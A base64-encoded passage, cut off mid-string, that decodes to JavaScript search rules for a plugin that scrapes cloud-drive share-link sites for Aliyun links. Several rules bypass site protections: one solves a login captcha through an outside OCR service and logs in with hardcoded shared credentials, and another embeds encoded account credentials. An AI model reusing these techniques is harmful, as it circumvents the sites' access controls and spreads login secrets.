JnN0eXBlPTIwMTAwJnVrPSZwYWdlPVxcXFxcXFwiICsgcGFnZSArIFxcXFxcXFwiJmxpbWl0PTIwJnNjcmVlbl9maWxldHlwZT11bmRlZmluZWRcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGxldCBqc29uID0gcG9zdChiYXNpY1VybCArIGFwaSwge1xcXFxuICAgICAgICAgICAgICAgIGJvZHk6IFxcXFxcXFwiZGF0YT1cXFxcXFxcIiArIGFwaSxcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFJlZmVyZXI6IFxcXFxcXFwiaHR0cHM6Ly93d3cueXVuc28ubmV0L2luZGV4L3VzZXIvcz93ZD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChzKVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSBKU09OLnBhcnNlKGpzb24pLmRhdGE7XFxcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IHBkZmEoaHRtbCwgXFxcXFxcXCJib2R5JiYubGF5dWktY2FyZDpoYXMoYSlcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgZm9yIChsZXQgaXRlbSBvZiBsaXN0KSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gcGRmaChpdGVtLCBcXFxcXFxcImEmJlRleHRcXFxcXFxcIikucmVwbGFjZShcXFxcXFxcIiPmlofku7blpLkgXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGxldCB0aW1lID0gL1xcXFxcXFxcZHs0fSgtXFxcXFxcXFxkezJ9KXsyfSBcXFxcXFxcXGR7Mn0oXFxcXFxcXFw6XFxcXFxcXFxkezJ9KXsyfS8uZXhlYyhwZGZoKGl0ZW0sIFxcXFxcXFwiLmxheXVpLWNhcmQtYm9keSYmVGV4dFxcXFxcXFwiKSkgfHwgW107XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiB0aW1lWzBdLFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IGJhc2U2NERlY29kZShwZGZoKGl0ZW0sIFxcXFxcXFwiYSYmdXJsXFxcXFxcXCIpKVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LCB7XFxcXG4gICAgICAgIG5hbWU6IFxcXFxcXFwi5re35ZCI55uYXFxcXFxcXCIsXFxcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxcXG4gICAgICAgIGZpbmQocywgcGFnZSkge1xcXFxuICAgICAgICAgICAgbGV0IHVybCA9IFxcXFxcXFwiaHR0cHM6Ly9hcGkuaHVuaGVwYW4uY29tL3YxL3NlYXJjaFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgbGV0IGpzb24gPSBwb3N0KHVybCwge1xcXFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgUmVmZXJlcjogXFxcXFxcXCJodHRwczovL2h1bmhlcGFuLmNvbS9cXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoe1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInFcXFxcXFxcIjogcyxcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJwYWdlXFxcXFxcXCI6IHBhZ2UsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwic2l6ZVxcXFxcXFwiOiAxNVxcXFxuICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIGpzb24gPSBKU09OLnBhcnNlKGpzb24pO1xcXFxuICAgICAgICAgICAgbGV0IGxpc3QgPSBqc29uLmRhdGEubGlzdDtcXFxcbiAgICAgICAgICAgIGxldCBkID0gW107XFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxpc3QubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBsaXN0W2ldO1xcXFxuICAgICAgICAgICAgICAgIGlmIChpdC5kaXNrX3R5cGUgIT09IFxcXFxcXFwiQUxZXFxcXFxcXCIgfHwgaXQuc2hhcmVfdXNlciA9PT0gXFxcXFxcXCLkuLYqKirkuLZcXFxcXFxcIikgY29udGludWU7XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGl0LmRpc2tfbmFtZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgcGljX3VybDogcGQoaXQsIFxcXFxcXFwiaW1nJiZzcmNcXFxcXFxcIiwgdXJsKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBpdC5saW5rLFxcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBpdC51cGRhdGVfdGltZSArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyBpdC5saW5rLFxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LCB7XFxcXG4gICAgICAgIG5hbWU6IFxcXFxcXFwi5LqR55uY6LWE5rqQXFxcXFxcXCIsXFxcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIGxldCB1cmwgPSBcXFxcXFxcImh0dHBzOi8vcmVzLnl1bnBhbi53aW4vP1BhZ2VJbmRleD1cXFxcXFxcIiArIHBhZ2UgKyBcXFxcXFxcIiZQYWdlU2l6ZT0xMiZLZXl3b3JkPVxcXFxcXFwiICsgcyArIFxcXFxcXFwiJlR5cGU9JlRhZz1cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdCh1cmwsIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiUmVmZXJlclxcXFxcXFwiOiBcXFxcXFxcImh0dHBzOi8vcmVzLnl1bnBhbi53aW4vXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcXFxcXCJtYWluJiYuY2FyZFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIC8vbG9nKGFycik7XFxcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwZGZoKGl0LCBcXFxcXFxcIi5jYXJkLWxpbmssMSYmb25jbGlja1xcXFxcXFwiKS5tYXRjaCgvaHR0cHM6XFxcXFxcXFwvXFxcXFxcXFwvKHd3d1xcXFxcXFxcLmFsaXl1bmRyaXZlXFxcXFxcXFwuY29tXFxcXFxcXFwvc3xhbHl3cFxcXFxcXFxcLm5ldClcXFxcXFxcXC9cXFxcXFxcXHcqL2cpIHx8IFtdO1xcXFxuICAgICAgICAgICAgICAgIHUgPSB1Lmxlbmd0aCA+IDAgPyB1WzBdIDogdXJsO1xcXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBwZGZoKGl0LCBcXFxcXFxcIi5jYXJkLXRpdGxlJiZUZXh0XFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBwZChpdCwgXFxcXFxcXCJpbWcmJnNyY1xcXFxcXFwiLCB1cmwpLFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IHBkZmgoaXQsIFxcXFxcXFwiLmNhcmQtdGV4dCwtMSYmVGV4dFxcXFxcXFwiKSArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyB1LFxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogXFxcXFxcXCJVUOS6keaQnFxcXFxcXFwiLFxcXFxuICAgICAgICBwYWdlOiB0cnVlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcXFxcXCJodHRwczovL2FwaS51cHl1bnNvMi5jb20vc2VhcmNoP2tleXdvcmQ9XFxcXFxcXCIgKyBzICsgXFxcXFxcXCImcGFnZT1cXFxcXFxcIiArIHBhZ2UgKyBcXFxcXFxcIiZzX3R5cGU9MVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCwge1xcXFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJSZWZlcmVyXFxcXFxcXCI6IFxcXFxcXFwiaHR0cHM6Ly93d3cudXB5dW5zby5jb21cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJDb29raWVcXFxcXFxcIjogXFxcXFxcXCJjb2RlPTE5MTlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgLy9sb2coYmFzZTY0RGVjb2RlKGh0bWwpKTtcXFxcbiAgICAgICAgICAgIGxldCBhcnIgPSBKU09OLnBhcnNlKGJhc2U2NERlY29kZShodG1sKSkucmVzdWx0Lml0ZW1zO1xcXFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXFxcbiAgICAgICAgICAgIGxldCBkID0gW107XFxcXG4gICAgICAgICAgICBpZiAoIWFycikgcmV0dXJuIFtdO1xcXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBpdC5wYWdlX3VybDtcXFxcbiAgICAgICAgICAgICAgICAvL3UgPSB1Lmxlbmd0aCA+IDAgPyB1WzBdIDogdXJsO1xcXFxuICAgICAgICAgICAgICAgIGlmICghdS5pbmNsdWRlcyhcXFxcXFxcImFsaXl1bmRyaXZlXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogaXQudGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdSxcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIiArICh1KSxcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogXFxcXFxcXCLnjKvni7jnm5jmkJxcXFxcXFxcIixcXFxcbiAgICAgICAgcGFnZTogZmFsc2UsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdChcXFxcXFxcImh0dHBzOi8vd3d3LmFsaXBhbnNvdS5jb20vc2VhcmNoP2s9XFxcXFxcXCIgKyBzLCB7XFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogXFxcXFxcXCJodHRwczovL3d3dy5hbGlwYW5zb3UuY29tL3NlYXJjaD9rPVxcXFxcXFwiICsgc1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcXFxcXCIjYXBwJiZhXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXFxcbiAgICAgICAgICAgIGxldCBkID0gW107XFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGxldCBpdCA9IFxcXFxcXFwiPGRpdj5cXFxcXFxcIiArIGFycltpXSArIFxcXFxcXFwiPC9kaXY+XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwZGZoKGl0LCBcXFxcXFxcImEmJmhyZWZcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgLy9sb2codSk7XFxcXG4gICAgICAgICAgICAgICAgaWYgKCF1LmluY2x1ZGVzKFxcXFxcXFwiL3MvXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB1ID0gXFxcXFxcXCJodHRwczovL3d3dy5hbGlwYW5zb3UuY29tXFxcXFxcXCIgKyB1LnJlcGxhY2UoXFxcXFxcXCIvcy9cXFxcXFxcIiwgXFxcXFxcXCIvY3YvXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBwZGZoKGl0LCBcXFxcXFxcInRlbXBsYXRlJiZUZXh0XFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IHBkZmgoaXQsIFxcXFxcXFwidGVtcGxhdGUsMSYmVGV4dFxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBkO1xcXFxuICAgICAgICB9LFxcXFxuICAgICAgICBmaW5kQWxpVXJsKGlucHV0KSB7XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoaW5wdXQsIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiQ29va2llXFxcXFxcXCI6IFxcXFxcXFwibm9fc2hvd19kb25hdGU9MVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogaW5wdXQucmVwbGFjZShcXFxcXFxcIi9jdi9cXFxcXFxcIiwgXFxcXFxcXCIvcy9cXFxcXFxcIilcXFxcbiAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgIHJlZGlyZWN0OiBmYWxzZVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICBodG1sID0gcGFyc2VEb21Gb3JIdG1sKGh0bWwsICdhJiZocmVmJyk7XFxcXG4gICAgICAgICAgICBpZiAoaHRtbC5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGh0bWw7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBpbnB1dDtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgIH0sXFxcXG4gICAge1xcXFxuICAgICAgICBuYW1lOiBcXFxcXFxcIuaYk+aQnFxcXFxcXFwiLFxcXFxuICAgICAgICBwYWdlOiB0cnVlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgYWxpVXRpbCA9ICQucmVxdWlyZShcXFxcXFxcImFsaVV0aWxcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBsZXQgQ3J5cHRvSlMgPSBhbGlVdGlsLmdldENyeXB0b0pTKCk7XFxcXG5cXFxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGtleWVuKHN0cikge1xcXFxuICAgICAgICAgICAgICAgIHZhciBrZXkgPSBDcnlwdG9KUy5lbmMuVXRmOC5wYXJzZShcXFxcXFxcIjRPVG9TY1VGT2FlVlRySEVcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICAgICAgICAgIGl2ID0gQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UoXFxcXFxcXCI5Q0xHYW8xdkhLcW0xN096XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIHZhciBlbmNyeXB0ZWQgPSBDcnlwdG9KUy5BRVMuZGVjcnlwdCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNpcGhlcnRleHQ6IENyeXB0b0pTLmVuYy5CYXNlNjQucGFyc2Uoc3RyKVxcXFxuICAgICAgICAgICAgICAgIH0sIGtleSwge1xcXFxuICAgICAgICAgICAgICAgICAgICBpdjogaXYsXFxcXG4gICAgICAgICAgICAgICAgICAgIG1vZGU6IENyeXB0b0pTLm1vZGUuQ0JDLFxcXFxuICAgICAgICAgICAgICAgICAgICBwYWRkaW5nOiBDcnlwdG9KUy5wYWQuUGtjczdcXFxcbiAgICAgICAgICAgICAgICB9KS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY3J5cHRlZDtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdChcXFxcXFxcImh0dHBzOi8veWlzby5mdW4vYXBpL3NlYXJjaD9uYW1lPVxcXFxcXFwiICsgcyArIFxcXFxcXFwiJnBhZ2VObz1cXFxcXFxcIiArIHBhZ2UsIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiUmVmZXJlclxcXFxcXFwiOiBcXFxcXFxcImh0dHBzOi8veWlzby5mdW4vaW5mbz9zZWFyY2hLZXk9XFxcXFxcXCIgKyBzLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIkNvb2tpZVxcXFxcXFwiOiBnZXRJdGVtKCd5aXNvdWNvb2tlJywgJycpXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAvL2xvZyhodG1sKTtcXFxcbiAgICAgICAgICAgIGlmIChodG1sLmluY2x1ZGVzKCfnmbvlvZXnlKjmiLfml6DpmZDliLYnKSkge1xcXFxuICAgICAgICAgICAgICAgIHZhciBpID0gMDtcXFxcbiAgICAgICAgICAgICAgICBkbyB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHZhciB0eWltZ2xpbiA9ICdodHRwczovL3lpc28uZnVuL2FwaS91c2VyL2xvZ2luL2NhcHRjaGE/dD0nICsgcGFyc2VJbnQobmV3IERhdGUoKS5nZXRUaW1lKCkpICsgJyc7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBpbWcgPSBjb252ZXJ0QmFzZTY0SW1hZ2UodHlpbWdsaW4pLnNwbGl0KCcsJylbMV07XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBjb2QgPSByZXF1ZXN0KCdodHRwczovL2FwaS54aG9mZS50b3Avb2NyL2I2NC90ZXh0Jywge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAndGV4dC9wbGFpbidcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBib2R5OiBpbWcsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJ1xcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFyIHZlciA9IEpTT04ucGFyc2UocmVxdWVzdCgnaHR0cHM6Ly95aXNvLmZ1bi9hcGkvdXNlci9sb2dpbicsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8veWlzby5mdW4vbG9naW4nLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb29raWUnOiBnZXRDb29raWUodHlpbWdsaW4pXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgYm9keToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxcXFwidXNlck5hbWVcXFxcXFxcIjogXFxcXFxcXCJ0dmJveDIwMjNcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInBhc3N3b3JkXFxcXFxcXCI6IFxcXFxcXFwiVHZib3gyMDIzXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJjb2RlXFxcXFxcXCI6IGNvZFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKHZlci5jb2RlID09IDIwMCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbG9nKCfmmJPmkJznmbvlhaXpqozor4HmiJDlip8nKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHNldEl0ZW0oJ3lpc291Y29va2UnLCBnZXRDb29raWUoJ2h0dHBzOi8veWlzby5mdW4nKSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBodG1sID0gcmVxdWVzdChcXFxcXFxcImh0dHBzOi8veWlzby5mdW4vYXBpL3NlYXJjaD9uYW1lPVxcXFxcXFwiICsgcyArIFxcXFxcXFwiJnBhZ2VObz1cXFxcXFxcIiArIHBhZ2UsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiUmVmZXJlclxcXFxcXFwiOiBcXFxcXFxcImh0dHBzOi8veWlzby5mdW4vaW5mbz9zZWFyY2hLZXk9XFxcXFxcXCIgKyBzLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIkNvb2tpZVxcXFxcXFwiOiBnZXRJdGVtKCd5aXNvdWNvb2tlJywgJycpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICBpKys7XFxcXG4gICAgICAgICAgICAgICAgfSB3aGlsZSAoaSA8IDQpO1xcXFxuXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBsZXQgYXJyID0gSlNPTi5wYXJzZShodG1sKS5kYXRhLmxpc3Q7XFxcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcXFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICAgICAgICAgIGxldCB1ID0ga2V5ZW4oaXQudXJsKTtcXFxcbiAgICAgICAgICAgICAgICAvL2xvZyh1KTtcXFxcbiAgICAgICAgICAgICAgICBpZiAodSA9PSBudWxsIHx8ICF1LmluY2x1ZGVzKFxcXFxcXFwiYWxpeXVuXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogaXQubmFtZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1LFxcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiAoaXQuZ210U2hhcmUgfHwgaXQuZ210Q3JlYXRlKSArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyAodSksXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG5cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBkO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICB7XFxcXG4gICAgICAgIG5hbWU6IFxcXFxcXFwi5om+6LWE5rqQXFxcXFxcXCIsXFxcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGdldGh0bWwoKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KFxcXFxcXFwiaHR0cHM6Ly96aGFveml5dWFuLm1lL3NvP2ZpbGVuYW1lPVxcXFxcXFwiICsgcyArIFxcXFxcXFwiJnBhZ2U9XFxcXFxcXCIgKyBwYWdlLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiUmVmZXJlclxcXFxcXFwiOiBcXFxcXFxcImh0dHBzOi8vemhhb3ppeXVhbi5tZS9zdG9wLmh0bWxcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxcXFwib3JpZ2luXFxcXFxcXCI6IFxcXFxcXFwiaHR0cHM6Ly96aGFveml5dWFuLm1lXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIkNvb2tpZVxcXFxcXFwiOiBnZXRJdGVtKFxcXFxcXFwienp5Y29va2VcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHNcXFxcXFxcIjogXFxcXFxcXCIxXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcImNvbnRlbnQtdHlwZVxcXFxcXFwiOiBcXFxcXFxcImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gaHRtbDtcXFxcbiAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICB2YXIgaHRtbCA9IGdldGh0bWwoKTtcXFxcbiAgICAgICAgICAgIGlmICghaHRtbC5pbmNsdWRlcyhcXFxcXFxcInNlYXJjaF9ib3hcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdXNlciA9ICdkWE5sY201aGJXVTllWEJxTWpBeU15WndZWE56ZDI5eVpEMTVjR295TURJeic7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGNvb2sgPSBKU09OLnBhcnNlKGZldGNoQ29va2llKCdodHRwczovL3poYW96aXl1YW4ubWUvbG9naXUuaHRtbCcsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBNT0JJTEVfVUEsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAnT3JpZ2luJzogJ2h0dHBzOi8vemhhb3ppeXVhbi5tZScsXFxcXG4gIC